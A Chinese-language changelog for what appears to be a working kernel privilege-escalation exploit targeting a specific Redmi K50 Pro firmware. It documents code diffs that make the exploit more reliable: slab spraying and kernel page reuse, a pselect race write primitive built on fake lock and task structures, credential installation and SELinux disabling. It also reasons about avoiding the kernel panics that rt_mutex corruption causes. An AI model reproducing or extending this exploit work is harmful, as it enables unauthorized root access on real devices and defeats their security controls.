# 源码变更记录 — Page Reuse 融合方案

> 基于 R8 源码,新增 Page Reuse 融合方案
> 日期: 2026-07-16
> 目标设备: matisse-OS2.0.6.0.ULKCNXM (Redmi K50 Pro, MTK 5.10.209)
>
> ★ R10 更新: main.c 父进程 prepare 改为 page holder 子进程 + pipe 传地址

---

## R9→R10 变更 (2026-07-16 ~10:30) ★ 崩溃修复

**问题**: R9 父进程直接调用 prepare_good_kernel_page() → 内核 panic (40s 后重启)
**根因**: 父进程(rish) prepare (543 clone + bruteforce 8CPU) → slab 耗尽 → panic

**修复**: `main.c` `run_direct_root_stage()`:
- **删除**: 父进程直接调用 `prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE)` (旧 70 行)
- **新增**: fork "page holder" 子进程 + pipe 通信 (~60 行)
  1. 父进程 fork page holder 子进程
  2. page holder 调用 prepare_good_kernel_page() (在子进程里安全)
  3. page holder 将 4 个地址通过 pipe 传回父进程
  4. page holder 进入 pause() 循环保持 memfds 打开
  5. 父进程设置 page_reuse_active=1
  6. 写操作完成后父进程 SIGKILL page holder
- **fallback**: fork/pipe/prepare 失败 → page_reuse_active=0 → R8 模式

---

## 变更概要

| 文件 | 变更量 | 核心改动 |
|------|--------|----------|
| `common.h` | +1 行 | 新增 `extern int page_reuse_active;` |
| `main.c` | +24 行 | 父进程一次性准备 page + reuse 标志管理 |
| `pipe.c` | +18 行 | 子进程 reuse 分支 + 动态超时 |
| `fops.c` | +1 条件 | retry 循环跳过重新 prepare |
| `Makefile` | +8 行 | Windows prebuilt 检测 + SHA256SUM 变量化 |

**总变更: ~52 行新增, 0 行删除**

---

## 详细变更

### 1. common.h (+1 行)

**位置**: 全局变量声明区

```diff
 extern int pselect_custom_shape;
 extern int direct_root_cpu;
+extern int page_reuse_active;
```

**用途**: 全局标志,控制子进程是否复用父进程准备的 kernel page。

---

### 2. main.c (+24 行)

#### 2a. 全局变量定义

```diff
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
+int page_reuse_active = 0;
```

#### 2b. `run_direct_root_stage` — 写操作前一次性准备 page

在 percpu_slot 验证之后、写操作序列之前插入:

```c
/* ── FUSION: prepare kernel page ONCE, reuse for all writes ── */
page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
    page_reuse_active = 0;  // 回退到原始模式
} else {
    page_reuse_active = 1;  // 启用复用模式
}
```

#### 2c. 错误路径清理

在所有 early return 路径添加 `page_reuse_active = 0;`:
- `install_real_cred` 失败时
- `install_cred_then_selinux_zero` 失败时

#### 2d. 完成后清理

```c
/* FUSION: disable reuse mode — all writes complete */
page_reuse_active = 0;
```

---

### 3. pipe.c (+18 行)

#### 3a. 子进程 reuse 分支

`direct_pselect_write_once_internal` 中,子进程入口处:

```c
if (!page_reuse_active) {
    // 原始模式: 清零 → prepare_good_kernel_page (543 clones) → 验证
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    prepare_skb_payload(page_base, PAGE_PAYLOAD_FOPS);
} else {
    // 融合模式: 验证继承的 page_base/fake_lock/fake_w0/fake_task 非零
    // 零 clone,直接进入 pselect 竞态
}
```

#### 3b. 动态超时

```c
uint64_t timeout_sec = page_reuse_active ? 60 : DIRECT_WRITE_TIMEOUT_SEC;
```

reuse 模式 60 秒 (vs 原始 180 秒),因为不需要 543 clone 的时间。

#### 3c. 日志增强

`pr_success` 增加 `reuse=%d` 字段,方便排查。

---

### 4. fops.c (+1 条件)

`do_pselect_fake_lock_route` 的 retry 循环:

```diff
 for (int attempt = 1; attempt <= PSELECT_ROUTE_ATTEMPTS; attempt++) {
-  if (attempt != 1) {
+  if (attempt != 1 && !page_reuse_active) {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
```

reuse 模式下 retry 不重新准备 page。

---

### 5. Makefile (+8 行)

#### 5a. Windows prebuilt 自动检测

```makefile
ifeq ($(OS),Windows_NT)
  NDK_PREBUILT := windows-x86_64
else
  NDK_PREBUILT := linux-x86_64
endif
NDK_TOOLCHAIN ?= $(if $(NDK_ROOT),$(NDK_ROOT)/toolchains/llvm/prebuilt/$(NDK_PREBUILT))
```

#### 5b. SHA256SUM 变量化

```makefile
SHA256SUM ?= sha256sum
```

编译规则中 `sha256sum $@` 改为 `$(SHA256SUM) $@`,Windows 下可传入 wrapper 路径。

#### 5c. list-projects 跨平台

```makefile
list-projects:
	@ls -d src/targets/*/ | sed 's#src/targets/##;s#/##' | sort
```

---

## Clone 数量影响

| 模式 | 写1 | 写2 | 写3 | 写4 (followup) | 总计 |
|------|-----|-----|-----|-----------------|------|
| 原始 R8 | 543 | 543 | 543 | 1086 | **~2715** |
| 融合 | 543 (父) | 0 | 0 | 0 | **~543** |

减少 **80%** 的进程创建开销。

---

## 安全性论证

1. **page 持久性**: spray_ctx ~199 个 memfd 保持打开,钉住 slab page;子进程 fork 继承
2. **payload 不变**: `prepare_skb_payload(FOPS)` 只更新用户态 skb_buf,不重新发送内核;kernel page 保持 SLIDE payload
3. **per-write 在 fd_set**: target/value 通过 `set_pselect_write` → `pselect_custom_target/value` → fd_set (用户态栈),与 kernel page 无关
4. **followup 复用**: 递归调用 `direct_pselect_write_once` 同样检查 `page_reuse_active`

---

## 剩余风险

**PI chain 腐败累积** — 每次 pselect 写原语在内核 rt_mutex 树留下损坏 waiter 指针。融合不解决此问题,但减少 clone 延迟后写操作更快,可能在 panic 前完成。

---

## 文件清单

```
src_patched/
├── CHANGELOG.md          ← 本文件
├── Makefile              ← 已适配 Windows
├── common.h              ← +1 行 (page_reuse_active)
├── main.c                ← +24 行 (fusion 逻辑)
├── pipe.c                ← +18 行 (reuse 分支)
├── fops.c                ← +1 条件 (retry 跳过)
├── util.c                ← 未修改 (原始 R8)
├── slide.c               ← 未修改 (原始 R8)
├── offset.h              ← 未修改
├── preload.c             ← 未修改
├── root.c                ← 未修改
├── su_daemon.c           ← 未修改
├── su_blob.S             ← 未修改
├── wallpaper_blob.S     ← 未修改
├── wallpaper.webp        ← 未修改
├── target.h              ← matisse-OS2.0.6.0.ULKCNXM 配置
└── kernelsnitch/         ← 未修改
    ├── futex_hash.h
    ├── kernelsnitch.h
    ├── timeutils.h
    └── utils.h
```
